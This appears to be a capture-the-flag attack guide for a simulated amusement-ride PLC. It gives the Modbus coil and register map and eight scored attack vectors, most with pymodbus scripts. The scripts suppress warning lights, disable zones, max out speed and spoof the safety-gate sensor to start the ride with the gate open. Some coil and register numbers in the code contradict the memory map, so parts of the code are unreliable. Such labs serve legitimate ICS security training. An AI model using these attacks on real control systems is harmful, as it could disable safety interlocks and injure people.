# Attraction Control System - Attack Guide

This guide provides detailed information on the enhanced PLC program and attack vectors for CTF challenges.

## PLC Memory Map

### Coils (Digital Outputs/Inputs)
- **%QX0.0** - `proximity_sensor` (BOOL) - Position sensor at event point
- **%QX0.1** - `master_enable` (BOOL) - System master enable
- **%QX0.2** - `emergency_stop_button` (BOOL) - E-stop activated
- **%QX0.3** - `flash_light` (BOOL) - Warning light output
- **%QX0.4** - `safety_gate_closed` (BOOL) - Safety gate status
- **%QX0.5** - `zone_1_enable` (BOOL) - Attraction zone 1 control
- **%QX0.6** - `zone_2_enable` (BOOL) - Attraction zone 2 control
- **%QX0.7** - `zone_3_enable` (BOOL) - Attraction zone 3 control
- **%QX0.8** - `zone_4_enable` (BOOL) - Attraction zone 4 control
- **%QX0.9** - `zone_5_enable` (BOOL) - Attraction zone 5 control
- **%QX0.10** - `start_command` (BOOL) - Start ride command
- **%QX0.11** - `stop_command` (BOOL) - Stop ride command
- **%QX0.12** - `motor_running` (BOOL) - Motor status
- **%QX0.13** - `brake_engaged` (BOOL) - Brake status
- **%QX0.14** - `alert_active` (BOOL) - Alert indicator
- **%QX0.15** - `maintenance_mode` (BOOL) - Maintenance mode flag

### Memory Words (Integers)
- **%MW0** - `speed_setpoint` (INT) - Target speed percentage (0-100)
- **%MW1** - `current_position` (INT) - Car position on track (0-359 degrees)
- **%MD2** - `runtime_hours` (DINT) - Total runtime in hours
- **%MD3** - `cycle_counter` (DINT) - Total ride cycles completed
- **%MW4** - `maintenance_flag` (INT) - Maintenance required flag
- **%MW5** - `last_error_code` (INT) - Most recent error code
- **%MW6** - `state` (INT) - State machine current state

## State Machine

### States
- **0: Idle** - System ready, waiting for start command
- **1: Starting** - Pre-start sequence, checks and preparation
- **2: Running** - Normal operation, ride in motion
- **3: Stopping** - Controlled shutdown sequence
- **4: Emergency** - Emergency stop triggered
- **5: Maintenance** - Maintenance mode active

### Safety Interlocks
The system checks three conditions before allowing operation:
1. `safety_gate_closed` must be TRUE
2. `emergency_stop_button` must be FALSE
3. `master_enable` must be TRUE

If all three pass, `safety_ok` becomes TRUE and the ride can start.

## Attack Vectors

### 1. Lights Out (Easy - 100pts)
**Objective:** Prevent flash light from activating when proximity sensor triggers

**Method:**
- Use MitM proxy to intercept Modbus traffic
- When `proximity_sensor` (coil 0) = TRUE, intercept and change to FALSE
- The PLC won't trigger the flash light

**Python Example:**
```python
from pymodbus.client import ModbusTcpClient

# Connect to PLC
client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Write FALSE to proximity_sensor
    client.write_coil(0, False, unit=1)
    client.close()
```

### 2. Zone Manipulation (Medium - 200pts)
**Objective:** Disable one or more attraction zones during operation

**Method:**
- Write FALSE to zone enable coils (5-9) while ride is running
- This simulates a zone failure scenario

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Disable zone 3 (coil 7)
    client.write_coil(7, False, unit=1)
    client.close()
```

### 3. Emergency Override (Easy - 150pts)
**Objective:** Trigger emergency stop via Modbus

**Method:**
- Write TRUE to emergency_stop_button (coil 2)
- PLC will immediately transition to state 4 (Emergency)

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Trigger emergency stop (coil 3)
    client.write_coil(3, True, unit=1)
    client.close()
```

### 4. Speed Control (Hard - 300pts)
**Objective:** Modify ride speed setpoint

**Method:**
- Write to holding register %MW0
- Change speed_setpoint value (0-100)

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Write to input register 0 (speed_setpoint)
    client.write_register(0, 100, unit=1)  # Max speed
    client.close()
```

### 5. Safety Bypass (Hard - 350pts)
**Objective:** Start ride with safety gate open

**Method:**
- Force `safety_gate_closed` (coil 4) to TRUE via Modbus
- Send `start_command` while physical gate is actually open
- This bypasses the safety interlock

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Fake safety_gate_closed
    client.write_coil(4, True, unit=1)
    # Send start_command
    client.write_coil(1, True, unit=1)
    client.close()
```

### 6. State Machine Attack (Hard - 400pts)
**Objective:** Force PLC into maintenance mode (state 5)

**Method:**
- Write directly to state register %MW6
- Set value to 5

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Write to state register (MW15 = holding register 1024+15)
    client.write_register(1024 + 15, 5, unit=1)  # Force state = 5
    client.close()
```

### 7. Runtime Manipulation (Medium - 250pts)
**Objective:** Trigger maintenance flag by manipulating counters

**Method:**
- Write to runtime_hours (%MD2) or cycle_counter (%MD3)
- Set values above thresholds (>100 hours or >1000 cycles)

**Attack:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('localhost', port=502)
if client.connect():
    # Write to runtime_hours (MD2 = holding registers for DINT)
    # DINT requires two consecutive registers
    client.write_registers(1024 + 2, [0, 101], unit=1)  # 101 hours
    client.close()
```

### 8. Full Laps Silent (Hard - 300pts)
**Objective:** Complete 3 full laps without flash light activating

**Method:**
- Continuously intercept and suppress proximity_sensor signals
- Maintain attack for entire duration of 3 laps
- Requires sustained MitM attack

**Requirements:**
- MitM proxy must be active
- Attack must be sustained for ~27 seconds (3 laps)
- No flash light activations allowed

## Modbus Communication Details

### Function Codes Used
- **01** - Read Coils
- **03** - Read Holding Registers
- **05** - Write Single Coil
- **06** - Write Single Register
- **15** - Write Multiple Coils
- **16** - Write Multiple Registers

### Connection Details
- **PLC Address:** localhost:502 (or OpenPLC container IP)
- **MitM Proxy:** localhost:8502
- **WebSocket Server:** localhost:8765

## Testing Workflow

1. Start the server: `cd scripts && ./start.sh`
2. Upload the ST program to OpenPLC
3. Open web interface at http://localhost:8080
4. Connect to PLC Modbus from the web interface
5. Start a ride session to begin tracking challenges
6. Execute attacks using Python scripts or the web console
7. Monitor CTF challenge completions in real-time

## Safety Notes

This is a **defensive security training environment**. The techniques demonstrated here are for:
- Understanding ICS/SCADA vulnerabilities
- Learning proper security controls
- Developing defensive strategies
- Red team/blue team exercises

**Never** use these techniques on production systems or systems you don't own.
